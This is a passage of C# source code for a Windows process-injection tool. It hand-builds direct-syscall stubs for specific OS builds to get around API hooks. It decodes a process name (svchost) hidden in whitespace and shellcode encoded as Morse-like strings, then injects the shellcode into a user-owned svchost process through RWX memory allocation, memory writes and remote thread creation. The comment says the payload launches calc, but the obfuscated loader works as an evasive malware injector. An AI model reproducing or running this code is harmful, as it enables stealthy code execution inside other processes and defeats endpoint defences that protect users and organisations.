                IntPtr allocMemAddress = (IntPtr)ptr;
                IntPtr allocMemAddressCopy = (IntPtr)ptr;
                MemoryProtection oldProtection;
                uint size = (uint)syscall.Length;
                IntPtr sizeIntPtr = (IntPtr)size;
                NTSTATUS status = ZwProtectVirtualMemory( (IntPtr)Process.GetCurrentProcess().Handle, ref allocMemAddress, ref sizeIntPtr, MemoryProtection.ExecuteReadWrite , out oldProtection );
                ZwCreateThreadExX ZwCreateThreadExFunc = (ZwCreateThreadExX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(ZwCreateThreadExX));
                return (NTSTATUS)ZwCreateThreadExFunc(out threadHandle, desiredAccess, objectAttributes, processHandle, lpStartAddress, lpParameter, createSuspended, stackZeroBits, sizeOfStackCommit, sizeOfStackReserve, lpBytesBuffer);
            }
        }
    }

    public static NTSTATUS ZwWriteVirtualMemory(IntPtr hProcess, ref IntPtr lpBaseAddress, IntPtr lpBuffer, uint nSize, ref IntPtr lpNumberOfBytesWritten)
    {
        byte [] syscall = GetOSVersionAndReturnSyscall( 3 );
        unsafe
        {
            fixed (byte* ptr = syscall)
            {
                IntPtr allocMemAddress = (IntPtr)ptr;
                IntPtr allocMemAddressCopy = (IntPtr)ptr;
                MemoryProtection oldProtection;
                uint size = (uint)syscall.Length;
                IntPtr sizeIntPtr = (IntPtr)size;
                NTSTATUS status = ZwProtectVirtualMemory( (IntPtr)Process.GetCurrentProcess().Handle, ref allocMemAddress, ref sizeIntPtr, MemoryProtection.ExecuteReadWrite , out oldProtection );
                ZwWriteVirtualMemoryX ZwWriteVirtualMemoryFunc = (ZwWriteVirtualMemoryX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(ZwWriteVirtualMemoryX));
                return (NTSTATUS)ZwWriteVirtualMemoryFunc(hProcess, lpBaseAddress, lpBuffer, nSize, ref lpNumberOfBytesWritten);
            }
        }
    }


    public static NTSTATUS ZwAllocateVirtualMemory(IntPtr hProcess, ref IntPtr BaseAddress, IntPtr ZeroBits, ref UIntPtr RegionSize, ulong AllocationType, ulong Protect)
    {
        byte [] syscall = GetOSVersionAndReturnSyscall( 4 );
        unsafe
        {
            fixed (byte* ptr = syscall)
            {
                IntPtr allocMemAddress = (IntPtr)ptr;
                IntPtr allocMemAddressCopy = (IntPtr)ptr;
                MemoryProtection oldProtection;
                uint size = (uint)syscall.Length;
                IntPtr sizeIntPtr = (IntPtr)size;
                NTSTATUS status = ZwProtectVirtualMemory( (IntPtr)Process.GetCurrentProcess().Handle, ref allocMemAddress, ref sizeIntPtr, MemoryProtection.ExecuteReadWrite , out oldProtection );
                ZwAllocateVirtualMemoryX ZwAllocateVirtualMemoryFunc = (ZwAllocateVirtualMemoryX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(ZwAllocateVirtualMemoryX));
                return (NTSTATUS)ZwAllocateVirtualMemoryFunc(hProcess, ref BaseAddress, ZeroBits, ref RegionSize, AllocationType, Protect);
            }
        }
    }

    public static NTSTATUS ZwCreateSection(ref IntPtr section, uint desiredAccess, IntPtr pAttrs, ref LARGE_INTEGER pMaxSize, uint pageProt, uint allocationAttribs, IntPtr hFile)
    {
        byte [] syscall = GetOSVersionAndReturnSyscall( 5 );
        unsafe
        {
            fixed (byte* ptr = syscall)
            {
                IntPtr allocMemAddress = (IntPtr)ptr;
                IntPtr allocMemAddressCopy = (IntPtr)ptr;
                MemoryProtection oldProtection;
                uint size = (uint)syscall.Length;
                IntPtr sizeIntPtr = (IntPtr)size;
                NTSTATUS status = ZwProtectVirtualMemory( (IntPtr)Process.GetCurrentProcess().Handle, ref allocMemAddress, ref sizeIntPtr, MemoryProtection.ExecuteReadWrite , out oldProtection );
                ZwCreateSectionX ZwCreateSectionFunc = (ZwCreateSectionX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(ZwCreateSectionX));
                return (NTSTATUS)ZwCreateSectionFunc(ref section, desiredAccess, pAttrs, ref pMaxSize, pageProt, allocationAttribs, hFile);
            }
        }
    }

    public static NTSTATUS ZwMapViewOfSection(IntPtr section, IntPtr process, ref IntPtr baseAddr, IntPtr zeroBits, IntPtr commitSize, IntPtr stuff, ref IntPtr viewSize, int inheritDispo, uint alloctype, uint prot)
    {
        byte [] syscall = GetOSVersionAndReturnSyscall( 6 );
        unsafe
        {
            fixed (byte* ptr = syscall)
            {
                IntPtr allocMemAddress = (IntPtr)ptr;
                IntPtr allocMemAddressCopy = (IntPtr)ptr;
                MemoryProtection oldProtection;
                uint size = (uint)syscall.Length;
                IntPtr sizeIntPtr = (IntPtr)size;
                NTSTATUS status = ZwProtectVirtualMemory( (IntPtr)Process.GetCurrentProcess().Handle, ref allocMemAddress, ref sizeIntPtr, MemoryProtection.ExecuteReadWrite , out oldProtection );
                ZwMapViewOfSectionX ZwMapViewOfSectionFunc = (ZwMapViewOfSectionX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(ZwMapViewOfSectionX));
                return (NTSTATUS)ZwMapViewOfSectionFunc(section, process, ref baseAddr, zeroBits, commitSize, stuff, ref viewSize, inheritDispo, alloctype, prot);
            }
        }
    }

    public static NTSTATUS ZwCreateProcess( out IntPtr threadHandle, uint desiredAccess, IntPtr objectAttributes, IntPtr processHandle, bool InheritObjectTable, IntPtr SectionHandle, IntPtr DebugPort, IntPtr ExceptionPort)
    {
        byte [] syscall = GetOSVersionAndReturnSyscall( 7 );
        unsafe
        {
            fixed (byte* ptr = syscall)
            {
                IntPtr allocMemAddress = (IntPtr)ptr;
                IntPtr allocMemAddressCopy = (IntPtr)ptr;
                MemoryProtection oldProtection;
                uint size = (uint)syscall.Length;
                IntPtr sizeIntPtr = (IntPtr)size;
                NTSTATUS status = ZwProtectVirtualMemory( (IntPtr)Process.GetCurrentProcess().Handle, ref allocMemAddress, ref sizeIntPtr, MemoryProtection.ExecuteReadWrite , out oldProtection );
                ZwCreateProcessX ZwCreateProcessFunc = (ZwCreateProcessX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(ZwCreateProcessX));
                return (NTSTATUS)ZwCreateProcessFunc(out threadHandle, desiredAccess, objectAttributes, processHandle, InheritObjectTable, SectionHandle, DebugPort, ExceptionPort);
            }
        }
    }

    public static NTSTATUS ZwOpenThread( IntPtr threadHandle, ProcessAccessFlags processAccess, OBJECT_ATTRIBUTES objAttribute, ref CLIENT_ID clientid)
    {
        byte [] syscall = GetOSVersionAndReturnSyscall( 8 );
        unsafe
        {
            fixed (byte* ptr = syscall)
            {
                IntPtr allocMemAddress = (IntPtr)ptr;
                IntPtr allocMemAddressCopy = (IntPtr)ptr;
                MemoryProtection oldProtection;
                uint size = (uint)syscall.Length;
                IntPtr sizeIntPtr = (IntPtr)size;
                NTSTATUS status = ZwProtectVirtualMemory( (IntPtr)Process.GetCurrentProcess().Handle, ref allocMemAddress, ref sizeIntPtr, MemoryProtection.ExecuteReadWrite , out oldProtection );
                ZwOpenThreadX ZwOpenThreadFunc = (ZwOpenThreadX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(ZwOpenThreadX));
                return (NTSTATUS)ZwOpenThreadFunc(threadHandle, processAccess, objAttribute, ref clientid);
            }

        }
    }

    public static NTSTATUS ZwResumeThread( IntPtr threadHandle, out ulong SuspendCount)
    {
        byte [] syscall = GetOSVersionAndReturnSyscall( 9 );
        unsafe
        {
            fixed (byte* ptr = syscall)
            {
                IntPtr allocMemAddress = (IntPtr)ptr;
                IntPtr allocMemAddressCopy = (IntPtr)ptr;
                MemoryProtection oldProtection;
                uint size = (uint)syscall.Length;
                IntPtr sizeIntPtr = (IntPtr)size;
                NTSTATUS status = ZwProtectVirtualMemory( (IntPtr)Process.GetCurrentProcess().Handle, ref allocMemAddress, ref sizeIntPtr, MemoryProtection.ExecuteReadWrite , out oldProtection );
                ZwResumeThreadX ZwResumeThreadFunc = (ZwResumeThreadX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(ZwResumeThreadX));
                return (NTSTATUS)ZwResumeThreadFunc(threadHandle, out SuspendCount);
            }

        }
    }

    public static void exec()
    {
        // name = svchost
        string name = "                   ?                      ?   ?        ?               ?                   ?                    ?";
        // Morse is shellcode, start calc
        string Morse = "-/    /         ?  /-/ ?-/       /  ? /  /         ?  /   /   ?  /  /  ?  /     /     ?  /     /     ?  /     /     ?-/       /  ? /    / ?-/-/     ?  /   /         ?  /     /     ?  /     /     ?  /     /     ?-/       /  ? /        /       ?  / /     ?  / /       ? /         /      ?-/         /     ?-/     /    ?  /-/      ? /   /        ?  /     /  ?-/       /  ?-/    /         ?-/        /        ?-/   /         ?-/       /  ?-/    /     ?  /    /        ?  /     /     ?  /     /     ?  /     /     ?  /  /      ?  /    /    ?-/    /   ? /    /     ?-/       / ? /        /       ? /         /        ?-/   /        ?-/       /    ?  /     /  ?  / /     ?  / /       ? /   /   ?-/ /    ? / /         ? /     /        ?  / /      ? /       /   ? /  /         ? /    /     ?  /    /     ? /    / ?-/        /   ? /   /    ?-/-/ ? /       /    ? /        /   ? /    /     ?-/       /         ?-/ /   ?-/    /      ? /   /    ?-/-/ ? /       /    ?  /    /       ? /    /     ?-/       /         ?-/    /     ? /-/  ? /   /    ? /   /   ?-/       /     ? /     /       ? /    /       ? /   /       ? / /-?  /     /     ? /   /    ? /        /       ?-/      /-? /  /   ?  /  /         ? /      /     ?-/   /     ?-/     /  ?  /  /      ? /       /-? /        /         ?-/  /  ?-/ /      ?  /-/ ?-/   /-?-/     /     ?-/ /     ? /-/    ?-/ /       ? /   /   ? /     /  ? /    /         ?-/  /   ? /        /         ? /     /      ? /       /-? / /         ? /    /         ?  /  /         ? /    /-?-/         /    ?  /   /-?-/      /         ?-/ /-? / /      ?  / /     ?  / /       ? /         /      ?-/  /   ? /       /         ?-/ /    ?  /     /    ? /     /     ? /     /         ?  / /      ?-/  /-?-/ /     ? /        /         ? /   /    ? /    /      ? /        /    ?-/         /  ? /     /   ?  /  /        ?-/  /  ?-/     /     ?-/   /-? /-/     ? /       /-? /     /         ?-/   /        ?-/ /   ?-/   /-? /        /         ?  /     /-?-/-/  ? /        /-?  / /    ?-/ /     ? /   /       ? / /-?  /     /     ? /   /    ? /        /       ?-/      /-? /  /   ? /     /  ?-/-/     ? /     /-?-/     /         ? /    /   ? /   /         ?-/      / ?  /   /         ?-/     /       ? /       /       ? /       /    ? /  /  ?  /-/     ? /         /        ?  / /      ?  /  /   ? /     /      ?  /     /   ? /    /  ?-/      /       ?-/  /  ?  / /-? /        /    ?-/         /  ? /     /   ?  /  /    ?-/  /  ?-/     /     ?-/   /-?  /   /      ? /        /         ?-/         /  ?  / /   ? /    /-?-/  /       ? /        /         ? /    /  ? /     /-? /        / ?  / /    ?-/-/         ? /   /   ?  / /  ?-/     /-?-/       /-? /         /    ?  /     /   ?-/-/       ? /     /  ? /     /      ?-/   /-? / /-? /    /    ?  / / ? /      /      ? /     /-? /  /         ? /   /   ?-/-/      ? / /         ? /    /        ? /         /    ? /  /       ?-/     /         ?  /    /         ? /   /   ?-/ /   ?  /-/ ?-/    /      ?  / /-? /        /         ? /    /  ? /   / ? /    /-?  / /  ?-/   /      ?-/   /         ?  /  / ?-/-/   ?-/    /-?-/   /        ? /     /   ?-/  /   ? /    /-?  /-/       ? /   /        ?  /     /  ?  / /     ?  / /       ? /         /      ?-/         /     ?-/     /    ? /   /    ?-/-/       ? / /   ?  / /    ?  / /      ? /         /      ?-/         /     ? / /         ? / /      ? /        /       ? / /         ? /        /    ?-/         /    ?-/     /         ? /   /        ? /    / ?-/    /      ? /     / ?  / /    ?  /  / ? /     /  ? /  /      ?  /    /         ? /      /   ? / /     ?-/  /   ?-/-/   ?-/-/  ? /    /     ?-/       / ? /     /     ?-/   /-?  /    /  ? /    /-? /  /        ?  /  / ?-/        /         ?-/      /   ? /         / ?-/      /       ?  /-/   ?-/    /         ? /        /       ? /         /      ? /       / ? /       / ?-/     /   ?-/     /    ? /     / ?  /-/   ? / /       ?-/ /   ?-/   /        ?-/ /       ?-/      /-?-/        /       ? /      /  ?  /   /   ?  /     /  ?";
        int ProcId = FindUserPID( ResolvProcessName(name) );
        byte [] scode = ResolveShellCode(Morse);
        CLIENT_ID clientid = new CLIENT_ID();
        clientid.UniqueProcess = new IntPtr(ProcId);
        clientid.UniqueThread = IntPtr.Zero;
        IntPtr byteWritten = IntPtr.Zero;
        IntPtr procHandle = IntPtr.Zero;
        ZwOpenProcess(ref procHandle, ProcessAccessFlags.All, new OBJECT_ATTRIBUTES(), ref clientid);
        IntPtr allocMemAddress = new IntPtr();
        UIntPtr scodeSize = (UIntPtr)(UInt32)scode.Length;
        ZwAllocateVirtualMemory(procHandle, ref allocMemAddress, new IntPtr(0), ref scodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        IntPtr unmanagedPointer = Marshal.AllocHGlobal(scode.Length);
        Marshal.Copy(scode, 0, unmanagedPointer, scode.Length);
        ZwWriteVirtualMemory(procHandle, ref allocMemAddress, unmanagedPointer, (UInt32)(scode.Length), ref byteWritten);
        Marshal.FreeHGlobal(unmanagedPointer);
        IntPtr hRemoteThread;
        ZwCreateThreadEx(out hRemoteThread, GENERIC_ALL, IntPtr.Zero, procHandle, allocMemAddress, IntPtr.Zero, 0, 0, 0, 0, IntPtr.Zero);
        CloseHandle(hRemoteThread);
        CloseHandle(procHandle);
  }

      public static string ResolvProcessName(string c)
      {
          string result = "";
          int num = 0;
          int index = 0;
          string tmp = "";
          for (int i = 1; i <= c.Length; i++) {
              tmp = c.Substring(index, 1);
                  if (tmp == " ") { num++; index++; }
                  else if (tmp == "?") {
                  if (num == 19) { result = result + "s"; num = 0; }
                  else
                  if (num == 22) { result = result + "v"; num = 0; }
                  else
                  if (num == 3) { result = result + "c"; num = 0; }
                  else
                  if (num == 8) { result = result + "h"; num = 0; }
                  else
                  if (num == 15) { result = result + "o"; num = 0; }
                  else
                  if (num == 20) { result = result + "t"; num = 0; }
                  index++;
              }
          }
          return result;
      }

      public static byte [] ResolveShellCode(string _P1)
      {
          byte [] _L1 = new byte [1];
          int _N1 = 0;
          string _N2 = "";
          int _N3 = 0;
          int _N4 = 0;
          for (int i = 1; i <= _P1.Length; i++) { if (_P1.Substring(_N3, 1) == " ") { _N1++; }
              else if (_P1.Substring(_N3, 1) == "|" || _P1.Substring(_N3,1) == "/") { if (_N1 > 0) { _N2 = _N2 + _N1.ToString(); _N1 = 0; } }
              else if (_P1.Substring(_N3, 1) == "-") { _N2 = _N2 + "0"; _N1 = 0; }
              else if (_P1.Substring(_N3, 1) == "?") { if (_P1.Substring(_N3 - 1, 1) == "?" || _P1.Substring(_N3 - 1, 1) == "-")
              {
                  Array.Resize(ref _L1, _N4 + 1);
                  _L1[_N4] = Byte.Parse( _N2 );
                  _N2 = "";
                  _N1 = 0;
                  _N4++;
              }
              else {
                  Array.Resize(ref _L1, _N4 + 1);
                  _L1[_N4] = Byte.Parse( _N2 + _N1.ToString() );
                  _N2 = "";
                  _N1 = 0;
                  _N4++;
              } }
              _N3++;
          }
          return _L1;
      }

      private static string GetProcessUser(Process process)
      {
          IntPtr processHandle = IntPtr.Zero;
          try
          {
              ZwOpenProcessToken(process.Handle, 8, out processHandle);
              WindowsIdentity wi = new WindowsIdentity(processHandle);
              string user = wi.Name;
              return user.Contains(@"\") ? user.Substring(user.IndexOf(@"\") + 1) : user;
          }
          catch
          {
              return null;
          }
          finally
          {
              if (processHandle != IntPtr.Zero)
              {
                  CloseHandle(processHandle);
              }
          }
      }


      public static int FindUserPID(string procName)
      {
          string owner;
          Process proc;
          int foundPID = 0;
          Process[] processList = Process.GetProcesses();
          foreach (Process process in processList)
          {
              if (process.ProcessName == procName) {
                  proc = Process.GetProcessById(process.Id);
                  owner = GetProcessUser(proc);
                  if (owner == Environment.UserName ) {
                      foundPID = process.Id;
                      break;
                  }
            }
        }
        return foundPID;
      }


      public static byte [] GetOSVersionAndReturnSyscall(int sysType )
      {
          var syscall = new byte [] { 001, 001, 001, 001, 001, 000, 000, 000, 001, 001, 001 };
          var osVersionInfo = new OSVERSIONINFOEXW { dwOSVersionInfoSize = Marshal.SizeOf(typeof(OSVERSIONINFOEXW)) };
          NTSTATUS OSdata = RtlGetVersion(ref osVersionInfo);

          if (osVersionInfo.dwPlatformId == 2) // Client OS
          {
              if (osVersionInfo.dwBuildNumber == 18362 || osVersionInfo.dwBuildNumber == 18363 )
              {
                  switch (sysType)
                  {
                      case 1: // ZwOpenProcess
                      unsafe
                      {
                        fixed (byte* ptr = syscall)
                        {
                              *(ptr + 0) = (byte) ( *(ptr + 0) + 0x48);
                              *(ptr + 1) = (byte) ( *(ptr + 1) + 0x88);
                              *(ptr + 2) = (byte) ( *(ptr + 2) + 0xC9);
                              *(ptr + 3) = (byte) ( *(ptr + 3) + 0xB7);
                              *(ptr + 4) = (byte) ( *(ptr + 4) + 0x25);
                              *(ptr + 5) = (byte) ( *(ptr + 5) + 0x00);
                              *(ptr + 6) = (byte) ( *(ptr + 6) + 0x00);
                              *(ptr + 7) = (byte) ( *(ptr + 7) + 0x00);
                              *(ptr + 8) = (byte) ( *(ptr + 8) + 0x0E);
                              *(ptr + 9) = (byte) ( *(ptr + 9) + 0x04);
                              *(ptr + 10) = (byte) ( *(ptr + 10) + 0xC2);
                        }
                      }
                      break;

                      case 2: // ZwCreateThreadEx
                      unsafe
                      {
                          fixed (byte* ptr = syscall)
                          {
                              *(ptr + 0) = (byte) ( *(ptr + 0) + 0x48);
                              *(ptr + 1) = (byte) ( *(ptr + 1) + 0x88);
                              *(ptr + 2) = (byte) ( *(ptr + 2) + 0xC9);
                              *(ptr + 3) = (byte) ( *(ptr + 3) + 0xB7);
                              *(ptr + 4) = (byte) ( *(ptr + 4) + 0xBC);
                              *(ptr + 5) = (byte) ( *(ptr + 5) + 0x00);
                              *(ptr + 6) = (byte) ( *(ptr + 6) + 0x00);
                              *(ptr + 7) = (byte) ( *(ptr + 7) + 0x00);
                              *(ptr + 8) = (byte) ( *(ptr + 8) + 0x0E);
                              *(ptr + 9) = (byte) ( *(ptr + 9) + 0x04);
                              *(ptr + 10) = (byte) ( *(ptr + 10) + 0xC2);
                          }
                      }
                      break;

                      case 3: // ZwWriteVirtualMemory
                      unsafe
                      {
                          fixed (byte* ptr = syscall)
                          {
                              *(ptr + 0) = (byte) ( *(ptr + 0) + 0x48);
                              *(ptr + 1) = (byte) ( *(ptr + 1) + 0x88);
                              *(ptr + 2) = (byte) ( *(ptr + 2) + 0xC9);
                              *(ptr + 3) = (byte) ( *(ptr + 3) + 0xB7);
                              *(ptr + 4) = (byte) ( *(ptr + 4) + 0x39);
                              *(ptr + 5) = (byte) ( *(ptr + 5) + 0x00);
                              *(ptr + 6) = (byte) ( *(ptr + 6) + 0x00);
                              *(ptr + 7) = (byte) ( *(ptr + 7) + 0x00);
                              *(ptr + 8) = (byte) ( *(ptr + 8) + 0x0E);
                              *(ptr + 9) = (byte) ( *(ptr + 9) + 0x04);
                              *(ptr + 10) = (byte) ( *(ptr + 10) + 0xC2);
                          }
                      }
                      break;

                      case 4: // ZwAllocateVirtualMemory
                      unsafe
                      {
                          fixed (byte* ptr = syscall)
                          {
                              *(ptr + 0) = (byte) ( *(ptr + 0) + 0x48);
                              *(ptr + 1) = (byte) ( *(ptr + 1) + 0x88);
                              *(ptr + 2) = (byte) ( *(ptr + 2) + 0xC9);
                              *(ptr + 3) = (byte) ( *(ptr + 3) + 0xB7);
                              *(ptr + 4) = (byte) ( *(ptr + 4) + 0x17);
                              *(ptr + 5) = (byte) ( *(ptr + 5) + 0x00);
                              *(ptr + 6) = (byte) ( *(ptr + 6) + 0x00);
                              *(ptr + 7) = (byte) ( *(ptr + 7) + 0x00);
                              *(ptr + 8) = (byte) ( *(ptr + 8) + 0x0e);
                              *(ptr + 9) = (byte) ( *(ptr + 9) + 0x04);
                              *(ptr + 10) = (byte) ( *(ptr + 10) + 0xC2);
                          }
                      }
                      break;

                      case 5: // ZwCreateSection
                      unsafe
                      {
                          fixed (byte* ptr = syscall)
                          {
                              *(ptr + 0) = (byte) ( *(ptr + 0) + 0x48);
                              *(ptr + 1) = (byte) ( *(ptr + 1) + 0x88);
                              *(ptr + 2) = (byte) ( *(ptr + 2) + 0xC9);
                              *(ptr + 3) = (byte) ( *(ptr + 3) + 0xB7);
                              *(ptr + 4) = (byte) ( *(ptr + 4) + 0x49);
                              *(ptr + 5) = (byte) ( *(ptr + 5) + 0x00);
                              *(ptr + 6) = (byte) ( *(ptr + 6) + 0x00);
                              *(ptr + 7) = (byte) ( *(ptr + 7) + 0x00);
                              *(ptr + 8) = (byte) ( *(ptr + 8) + 0x0E);
                              *(ptr + 9) = (byte) ( *(ptr + 9) + 0x04);
                              *(ptr + 10) = (byte) ( *(ptr + 10) + 0xC2);
                          }
                      }
                      break;

                      case 6: // ZwMapViewOfSection
                      unsafe
                      {
                          fixed (byte* ptr = syscall)
                          {
                              *(ptr + 0) = (byte) ( *(ptr + 0) + 0x48);
                              *(ptr + 1) = (byte) ( *(ptr + 1) + 0x88);
                              *(ptr + 2) = (byte) ( *(ptr + 2) + 0xC9);
                              *(ptr + 3) = (byte) ( *(ptr + 3) + 0xB7);
                              *(ptr + 4) = (byte) ( *(ptr + 4) + 0x27);
                              *(ptr + 5) = (byte) ( *(ptr + 5) + 0x00);
                              *(ptr + 6) = (byte) ( *(ptr + 6) + 0x00);
                              *(ptr + 7) = (byte) ( *(ptr + 7) + 0x00);
                              *(ptr + 8) = (byte) ( *(ptr + 8) + 0x0E);
                              *(ptr + 9) = (byte) ( *(ptr + 9) + 0x04);
                              *(ptr + 10) = (byte) ( *(ptr + 10) + 0xC2);
                          }
                      }
                      break;

                      case 7: // ZwCreateProcess
                      unsafe
                      {
                          fixed (byte* ptr = syscall)
                          {
                              *(ptr + 0) = (byte) ( *(ptr + 0) + 0x48);
                              *(ptr + 1) = (byte) ( *(ptr + 1) + 0x88);
                              *(ptr + 2) = (byte) ( *(ptr + 2) + 0xC9);
                              *(ptr + 3) = (byte) ( *(ptr + 3) + 0xB7);
                              *(ptr + 4) = (byte) ( *(ptr + 4) + 0x76);
                              *(ptr + 5) = (byte) ( *(ptr + 5) + 0x00);
                              *(ptr + 6) = (byte) ( *(ptr + 6) + 0x00);
                              *(ptr + 7) = (byte) ( *(ptr + 7) + 0x00);
                              *(ptr + 8) = (byte) ( *(ptr + 8) + 0x0E);
                              *(ptr + 9) = (byte) ( *(ptr + 9) + 0x04);
                              *(ptr + 10) = (byte) ( *(ptr + 10) + 0xC2);
                          }
                      }
                      break;

                      case 8: // ZwOpenThread
                      unsafe
                      {
                          fixed (byte* ptr = syscall)
                          {
                              *(ptr + 0) = (byte) ( *(ptr + 0) + 0x48);
                              *(ptr + 1) = (byte) ( *(ptr + 1) + 0x88);
                              *(ptr + 2) = (byte) ( *(ptr + 2) + 0xC9);
                              *(ptr + 3) = (byte) ( *(ptr + 3) + 0xB7);
                              *(ptr + 4) = (byte) ( *(ptr + 4) + 0x128);
                              *(ptr + 5) = (byte) ( *(ptr + 5) + 0x00);
                              *(ptr + 6) = (byte) ( *(ptr + 6) + 0x00);
                              *(ptr + 7) = (byte) ( *(ptr + 7) + 0x00);
                              *(ptr + 8) = (byte) ( *(ptr + 8) + 0x0E);
                              *(ptr + 9) = (byte) ( *(ptr + 9) + 0x04);
                              *(ptr + 10) = (byte) ( *(ptr + 10) + 0xC2);
                          }
                     }
                     break;

                     case 9: // ZwResumeThread
                     unsafe
                     {
                         fixed (byte* ptr = syscall)
                         {
                             *(ptr + 0) = (byte) ( *(ptr + 0) + 0x48);
                             *(ptr + 1) = (byte) ( *(ptr + 1) + 0x88);
                             *(ptr + 2) = (byte) ( *(ptr + 2) + 0xC9);
                             *(ptr + 3) = (byte) ( *(ptr + 3) + 0xB7);
                             *(ptr + 4) = (byte) ( *(ptr + 4) + 0x51);
                             *(ptr + 5) = (byte) ( *(ptr + 5) + 0x00);
                             *(ptr + 6) = (byte) ( *(ptr + 6) + 0x00);
                             *(ptr + 7) = (byte) ( *(ptr + 7) + 0x00);
                             *(ptr + 8) = (byte) ( *(ptr + 8) + 0x0E);
                             *(ptr + 9) = (byte) ( *(ptr + 9) + 0x04);
                             *(ptr + 10) = (byte) ( *(ptr + 10) + 0xC2);
                         }
                    }
                    break;

                    case 10: // ZwOpenProcessToken
                    unsafe
                    {
                        fixed (byte* ptr = syscall)
                        {
                            *(ptr + 0) = (byte) ( *(ptr + 0) + 0x48);
                            *(ptr + 1) = (byte) ( *(ptr + 1) + 0x88);
                            *(ptr + 2) = (byte) ( *(ptr + 2) + 0xC9);
                            *(ptr + 3) = (byte) ( *(ptr + 3) + 0xB7);
                            *(ptr + 4) = (byte) ( *(ptr + 4) + 0x122);
                            *(ptr + 5) = (byte) ( *(ptr + 5) + 0x00);
                            *(ptr + 6) = (byte) ( *(ptr + 6) + 0x00);
                            *(ptr + 7) = (byte) ( *(ptr + 7) + 0x00);
                            *(ptr + 8) = (byte) ( *(ptr + 8) + 0x0E);
                            *(ptr + 9) = (byte) ( *(ptr + 9) + 0x04);
                            *(ptr + 10) = (byte) ( *(ptr + 10) + 0xC2);
                        }
                   }
                   break;



                  } //switch (sysType)
              } // if
              else
              if (osVersionInfo.dwBuildNumber == 17763)
              {
                switch (sysType)
                {
                    case 1: // ZwOpenProcess
                    unsafe
                    {
                        fixed (byte* ptr = syscall)
                        {
                            *(ptr + 0) = (byte) ( *(ptr + 0) + 0x48);
                            *(ptr + 1) = (byte) ( *(ptr + 1) + 0x88);
                            *(ptr + 2) = (byte) ( *(ptr + 2) + 0xC9);
                            *(ptr + 3) = (byte) ( *(ptr + 3) + 0xB7);
                            *(ptr + 4) = (byte) ( *(ptr + 4) + 0x25);
                            *(ptr + 5) = (byte) ( *(ptr + 5) + 0x00);
                            *(ptr + 6) = (byte) ( *(ptr + 6) + 0x00);
                            *(ptr + 7) = (byte) ( *(ptr + 7) + 0x00);
                            *(ptr + 8) = (byte) ( *(ptr + 8) + 0x0E);
                            *(ptr + 9) = (byte) ( *(ptr + 9) + 0x04);
                            *(ptr + 10) = (byte) ( *(ptr + 10) + 0xC2);
                        }
                    }
                    break;

                    case 2: // ZwCreateThreadEx
                    unsafe
                    {
                        fixed (byte* ptr = syscall)
                        {
                            *(ptr + 0) = (byte) ( *(ptr + 0) + 0x48);
                            *(ptr + 1) = (byte) ( *(ptr + 1) + 0x88);
                            *(ptr + 2) = (byte) ( *(ptr + 2) + 0xC9);
                            *(ptr + 3) = (byte) ( *(ptr + 3) + 0xB7);
                            *(ptr + 4) = (byte) ( *(ptr + 4) + 0xBB);
                            *(ptr + 5) = (byte) ( *(ptr + 5) + 0x00);
                            *(ptr + 6) = (byte) ( *(ptr + 6) + 0x00);
                            *(ptr + 7) = (byte) ( *(ptr + 7) + 0x00);
                            *(ptr + 8) = (byte) ( *(ptr + 8) + 0x0E);
                            *(ptr + 9) = (byte) ( *(ptr + 9) + 0x04);
                            *(ptr + 10) = (byte) ( *(ptr + 10) + 0xC2);
                        }
                    }
                    break;

                    case 3: // ZwWriteVirtualMemory
                    unsafe
                    {
                        fixed (byte* ptr = syscall)
                        {
                            *(ptr + 0) = (byte) ( *(ptr + 0) + 0x48);
                            *(ptr + 1) = (byte) ( *(ptr + 1) + 0x88);
                            *(ptr + 2) = (byte) ( *(ptr + 2) + 0xC9);
                            *(ptr + 3) = (byte) ( *(ptr + 3) + 0xB7);
                            *(ptr + 4) = (byte) ( *(ptr + 4) + 0x39);
                            *(ptr + 5) = (byte) ( *(ptr + 5) + 0x00);
                            *(ptr + 6) = (byte) ( *(ptr + 6) + 0x00);
                            *(ptr + 7) = (byte) ( *(ptr + 7) + 0x00);
                            *(ptr + 8) = (byte) ( *(ptr + 8) + 0x0E);
                            *(ptr + 9) = (byte) ( *(ptr + 9) + 0x04);
                            *(ptr + 10) = (byte) ( *(ptr + 10) + 0xC2);
                        }
                    }
                    break;

                    case 4: // ZwAllocateVirtualMemory
                    unsafe
                    {
                        fixed (byte* ptr = syscall)
                        {
                            *(ptr + 0) = (byte) ( *(ptr + 0) + 0x48);
                            *(ptr + 1) = (byte) ( *(ptr + 1) + 0x88);
                            *(ptr + 2) = (byte) ( *(ptr + 2) + 0xC9);
                            *(ptr + 3) = (byte) ( *(ptr + 3) + 0xB7);
                            *(ptr + 4) = (byte) ( *(ptr + 4) + 0x17);
                            *(ptr + 5) = (byte) ( *(ptr + 5) + 0x00);
                            *(ptr + 6) = (byte) ( *(ptr + 6) + 0x00);
                            *(ptr + 7) = (byte) ( *(ptr + 7) + 0x00);
                            *(ptr + 8) = (byte) ( *(ptr + 8) + 0x0E);
                            *(ptr + 9) = (byte) ( *(ptr + 9) + 0x03);
                            *(ptr + 10) = (byte) ( *(ptr + 10) + 0xC2);
                        }
                    }
                    break;

                    case 5: // ZwCreateSection
                    unsafe
                    {
                        fixed (byte* ptr = syscall)
                        {
                            *(ptr + 0) = (byte) ( *(ptr + 0) + 0x48);
                            *(ptr + 1) = (byte) ( *(ptr + 1) + 0x88);
                            *(ptr + 2) = (byte) ( *(ptr + 2) + 0xC9);
                            *(ptr + 3) = (byte) ( *(ptr + 3) + 0xB7);
                            *(ptr + 4) = (byte) ( *(ptr + 4) + 0x49);
                            *(ptr + 5) = (byte) ( *(ptr + 5) + 0x00);
                            *(ptr + 6) = (byte) ( *(ptr + 6) + 0x00);
                            *(ptr + 7) = (byte) ( *(ptr + 7) + 0x00);
                            *(ptr + 8) = (byte) ( *(ptr + 8) + 0x0E);
                            *(ptr + 9) = (byte) ( *(ptr + 9) + 0x04);
